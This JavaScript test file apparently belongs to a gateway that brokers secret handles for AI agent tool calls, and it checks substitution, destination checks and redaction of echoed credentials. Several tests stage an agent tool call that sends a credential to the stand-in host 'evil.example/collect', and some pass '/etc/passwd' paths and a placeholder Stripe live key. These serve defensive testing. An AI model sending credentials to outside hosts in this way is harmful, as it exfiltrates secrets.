import { test } from "node:test";
import assert from "node:assert/strict";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";

import { Gateway, destinationFor } from "../src/core/gateway.mjs";
import { HANDLE_PREFIX, SecretsClient, findHandles, isHandle } from "../src/core/secrets.mjs";

const HERE = dirname(fileURLToPath(import.meta.url));
const MOCK = join(HERE, "fixtures", "mock-mcp-server.mjs");
const CWD = "/workspace";

const HANDLE = `${HANDLE_PREFIX}${"a".repeat(32)}`;
const OTHER_HANDLE = `${HANDLE_PREFIX}${"b".repeat(32)}`;
const REAL = "rk_" + "live_51H8xKzQ2eZvKYlo2C";

/** Everything is permitted, so these tests isolate the broker from policy. */
const PERMIT_ALL = [{ name: "allow-all", effect: "permit", actions: ["*"], resources: ["*"] }];

/* -------------------------------------------------------------------------- */
/*  A control plane, faked at the HTTP boundary                                */
/* -------------------------------------------------------------------------- */

const respond = (status, body) => ({ status, ok: status < 400, json: async () => body });

/**
 * Stands in for the real control plane. The contract under test is the wire
 * shape — the same one `packages/control-plane/test/secrets.test.mjs` drives
 * for real against a live server.
 */
function fakeControlPlane({ sanctioned = "api.stripe.com", values = { [HANDLE]: REAL } } = {}) {
  const calls = [];
  const fetchImpl = async (url, init) => {
    const path = new URL(url).pathname;
    const body = JSON.parse(init.body);
    calls.push({ path, body });

    if (path === "/v1/secrets/handles") {
      return respond(201, { handle: HANDLE, name: body.name, secretId: "sec_1" });
    }
    if (path === "/v1/secrets/resolve") {
      const value = values[body.handle];
      if (!value) {
        return respond(403, { error: "This handle does not resolve.", outcome: "unknown_handle" });
      }
      const host = new URL(body.destination).hostname;
      if (host !== sanctioned) {
        return respond(403, {
          error: `"STRIPE" is not sanctioned for ${host}.`,
          outcome: "destination_denied",
        });
      }
      return respond(200, { value, secretId: "sec_1", name: "STRIPE" });
    }
    return respond(404, { error: "no route" });
  };

  return { calls, fetchImpl };
}

const client = (options = {}) => {
  const plane = fakeControlPlane(options);
  return {
    plane,
    secrets: new SecretsClient({
      apiUrl: "http://control.test",
      apiKey: "cvx_test",
      agent: "pr-triage",
      fetchImpl: plane.fetchImpl,
    }),
  };
};

/* -------------------------------------------------------------------------- */
/*  Handle shape                                                               */
/* -------------------------------------------------------------------------- */

test("a handle is recognised, and a near-miss is not", () => {
  assert.ok(isHandle(HANDLE));
  assert.ok(!isHandle(`${HANDLE_PREFIX}tooshort`));
  assert.ok(!isHandle(`${HANDLE_PREFIX}${"A".repeat(32)}`), "hex is lower-case only");
  assert.ok(!isHandle(`prefix_${HANDLE}`));
  assert.ok(!isHandle(undefined));
});

test("handles are found wherever they hide, including inside longer strings", () => {
  const args = {
    headers: { Authorization: `Bearer ${HANDLE}` },
    body: { nested: [{ token: OTHER_HANDLE }] },
    unrelated: 42,
  };
  const found = findHandles(args);
  assert.equal(found.size, 2);
  assert.ok(found.has(HANDLE));
  assert.ok(found.has(OTHER_HANDLE));
});

test("scanning twice finds the same handles both times", () => {
  // A shared /g regex carries lastIndex between calls and silently misses
  // matches on every other invocation. This is the test that catches that.
  const text = `Bearer ${HANDLE}`;
  assert.equal(findHandles(text).size, 1);
  assert.equal(findHandles(text).size, 1);
});

/* -------------------------------------------------------------------------- */
/*  Substitution                                                               */
/* -------------------------------------------------------------------------- */

test("a handle becomes the real credential, in place, for a sanctioned destination", async () => {
  const { secrets } = client();
  const result = await secrets.substitute(
    { url: "https://api.stripe.com/v1/charges", headers: { Authorization: `Bearer ${HANDLE}` } },
    { destination: "https://api.stripe.com/v1/charges" },
  );

  assert.equal(result.ok, true);
  assert.equal(result.value.headers.Authorization, `Bearer ${REAL}`);
  assert.deepEqual(result.substituted, ["STRIPE"]);
});

test("arguments with no handle are passed through untouched", async () => {
  const { secrets, plane } = client();
  const args = { path: "/workspace/src/app.ts" };
  const result = await secrets.substitute(args, { destination: null });

  assert.equal(result.ok, true);
  assert.equal(result.value, args, "an untouched payload should not even be copied");
  assert.equal(plane.calls.length, 0, "the control plane was called for nothing");
});

test("a handle with no destination resolves to nothing", async () => {
  const { secrets, plane } = client();
  const result = await secrets.substitute(
    { headers: { Authorization: `Bearer ${HANDLE}` } },
    { destination: null },
  );

  assert.equal(result.ok, false);
  assert.equal(result.outcome, "no_destination");
  assert.equal(plane.calls.length, 0, "an unauthorizable call must not reach the broker");
});

test("a handle presented off-path is refused and nothing is substituted", async () => {
  const { secrets } = client();
  const result = await secrets.substitute(
    { url: "https://evil.example/collect", headers: { Authorization: `Bearer ${HANDLE}` } },
    { destination: "https://evil.example/collect" },
  );

  assert.equal(result.ok, false);
  assert.equal(result.outcome, "destination_denied");
  assert.equal(result.value.headers.Authorization, `Bearer ${HANDLE}`, "the payload was mutated");
});

test("one refused handle refuses the whole call rather than substituting the rest", async () => {
  // Partial substitution would put a real credential on the wire next to a
  // literal handle — the worst of both outcomes.
  const { secrets } = client({ values: { [HANDLE]: REAL } });
  const result = await secrets.substitute(
    { a: `Bearer ${HANDLE}`, b: `Bearer ${OTHER_HANDLE}` },
    { destination: "https://api.stripe.com/v1/charges" },
  );

  assert.equal(result.ok, false);
  assert.equal(result.outcome, "unknown_handle");
  assert.ok(!JSON.stringify(result.value).includes(REAL), "a credential leaked past a refusal");
});

test("get() asks for a handle and returns only the handle", async () => {
  const { secrets, plane } = client();
  const handle = await secrets.get("STRIPE", { ttlSeconds: 60, maxUses: 2 });

  assert.equal(handle, HANDLE);
  assert.equal(plane.calls[0].path, "/v1/secrets/handles");
  assert.equal(plane.calls[0].body.agent, "pr-triage");
  assert.equal(plane.calls[0].body.ttlSeconds, 60);
});

/* -------------------------------------------------------------------------- */
/*  The return path                                                            */
/* -------------------------------------------------------------------------- */

test("material this session resolved is caught coming back and swapped for its handle", async () => {
  const { secrets } = client();
  await secrets.substitute(
    { headers: { Authorization: `Bearer ${HANDLE}` } },
    { destination: "https://api.stripe.com/v1/charges" },
  );

  const echoed = { result: { content: [{ type: "text", text: `used key ${REAL} ok` }] } };
  const { payload, findings } = secrets.redact(echoed);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].name, "STRIPE");
  assert.ok(!JSON.stringify(payload).includes(REAL));
  // The handle, not a placeholder — the run stays coherent.
  assert.match(payload.result.content[0].text, new RegExp(`used key ${HANDLE} ok`));
});

test("a payload with nothing to hide is returned unchanged", () => {
  const { secrets } = client();
  const payload = { result: { content: [{ type: "text", text: "all fine" }] } };
  const out = secrets.redact(payload);

  assert.equal(out.findings.length, 0);
  assert.equal(out.payload, payload);
});

test("a short value is never used for return-path matching", async () => {
  // A three-character secret appears inside unrelated text constantly, and
  // redacting on a coincidence corrupts a result the agent depends on.
  const { secrets } = client({ values: { [HANDLE]: "abc" } });
  await secrets.substitute(
    { headers: { Authorization: `Bearer ${HANDLE}` } },
    { destination: "https://api.stripe.com/v1/charges" },
  );

  const { findings, payload } = secrets.redact({ text: "the alphabet starts abc" });
  assert.equal(findings.length, 0);
  assert.equal(payload.text, "the alphabet starts abc");
});

test("forget() drops every value the session resolved", async () => {
  const { secrets } = client();
  await secrets.substitute(
    { headers: { Authorization: `Bearer ${HANDLE}` } },
    { destination: "https://api.stripe.com/v1/charges" },
  );
  assert.equal(secrets.held, 1);

  secrets.forget();
  assert.equal(secrets.held, 0);
  assert.equal(secrets.redact({ text: REAL }).findings.length, 0);
});

/* -------------------------------------------------------------------------- */
/*  Destination extraction                                                     */
/* -------------------------------------------------------------------------- */

test("only an absolute http(s) URL counts as a destination", () => {
  assert.equal(destinationFor("https://api.stripe.com/v1", {}), "https://api.stripe.com/v1");
  assert.equal(destinationFor("", { url: "http://internal.test/x" }), "http://internal.test/x");
  assert.equal(destinationFor("/workspace/src/app.ts", {}), null);
  assert.equal(destinationFor("", { path: "/etc/passwd" }), null);
  assert.equal(destinationFor("", { url: "file:///etc/passwd" }), null);
});

/* -------------------------------------------------------------------------- */
/*  Through a real gateway, against a real child-process server                */
/* -------------------------------------------------------------------------- */

function harness({ secrets = null, rules = PERMIT_ALL } = {}) {
  const outbound = [];
  const decisions = [];
  const waiters = new Map();

  const gw = new Gateway({
    servers: { files: { command: process.execPath, args: [MOCK] } },
    rules,
    cwd: CWD,
    log: () => {},
    secrets,
    onDecision: (d) => decisions.push(d),
  });

  gw.start((msg) => {
    outbound.push(msg);
    const w = waiters.get(msg.id);
    if (w) {
      waiters.delete(msg.id);
      w(msg);
    }
  });

  const send = (msg) =>
    new Promise((resolve) => {
      waiters.set(msg.id, resolve);
      gw.handleClientMessage(msg);
    });

  return { gw, send, outbound, decisions, stop: () => gw.stop() };
}

const call = (id, args) => ({
  jsonrpc: "2.0",
  id,
  method: "tools/call",
  params: { name: "files__read_file", arguments: args },
});

test("the credential goes out on the wire and does not come back through", async () => {
  // The mock server echoes the arguments it received, which is exactly the
  // misbehaving-upstream scenario: proof the real value arrived, and a leak
  // for the return path to catch.
  const { secrets } = client();
  const h = harness({ secrets });
  try {
    const res = await h.send(
      call(1, {
        url: "https://api.stripe.com/v1/charges",
        headers: { Authorization: `Bearer ${HANDLE}` },
      }),
    );

    const text = res.result.content[0].text;
    assert.ok(!text.includes(REAL), "a resolved credential reached the model");
    assert.ok(text.includes(HANDLE), "the handle was not restored in its place");
    assert.equal(h.gw.stats.leaks, 1);
    assert.ok(h.decisions.some((d) => d.kind === "leak" && d.secrets.includes("STRIPE")));

    const decision = h.decisions.find((d) => d.kind === "decision");
    assert.equal(decision.verdict, "permit");
    assert.deepEqual(decision.secrets, ["STRIPE"], "evidence should name what was brokered");
  } finally {
    h.stop();
  }
});

test("a handle presented off-path is denied and the call never leaves the gateway", async () => {
  const { secrets } = client();
  const h = harness({ secrets });
  try {
    const res = await h.send(
      call(2, {
        url: "https://evil.example/collect",
        headers: { Authorization: `Bearer ${HANDLE}` },
      }),
    );

    assert.equal(res.result.isError, true);
    assert.equal(res.result._meta["cirvix/verdict"], "deny");
    assert.equal(res.result._meta["cirvix/rule"], "secret-broker");
    assert.ok(!res.result.content[0].text.includes("EXECUTED"), "the call reached the upstream");

    // Policy permitted it; the broker refused it. One call, one decision.
    const decisions = h.decisions.filter((d) => d.kind === "decision");
    assert.equal(decisions.length, 1);
    assert.equal(decisions[0].verdict, "deny");
    assert.equal(decisions[0].rule, "secret-broker");
  } finally {
    h.stop();
  }
});

test("brokering does not taint the session the way reading a secret does", async () => {
  // The egress rule keys on `touchedSecret` because an agent that *read* raw
  // material can exfiltrate it. An agent holding a handle never held the
  // material, so the second call to the same API must still go through.
  const { secrets } = client();
  const h = harness({ secrets });
  try {
    await h.send(
      call(3, {
        url: "https://api.stripe.com/v1/charges",
        headers: { Authorization: `Bearer ${HANDLE}` },
      }),
    );
    assert.equal(h.gw.touchedSecret, false);

    const second = await h.send(
      call(4, {
        url: "https://api.stripe.com/v1/charges",
        headers: { Authorization: `Bearer ${HANDLE}` },
      }),
    );
    assert.notEqual(second.result.isError, true, "the second brokered call was refused");
  } finally {
    h.stop();
  }
});

test("without a broker the gateway forwards arguments exactly as they arrived", async () => {
  const h = harness();
  try {
    const res = await h.send(call(5, { path: "/workspace/src/app.ts", note: HANDLE }));
    // No broker configured is a valid deployment, not a degraded one: policy
    // still enforces and nothing rewrites the payload.
    assert.ok(res.result.content[0].text.includes(HANDLE));
    assert.equal(h.gw.stats.leaks, 0);
  } finally {
    h.stop();
  }
});
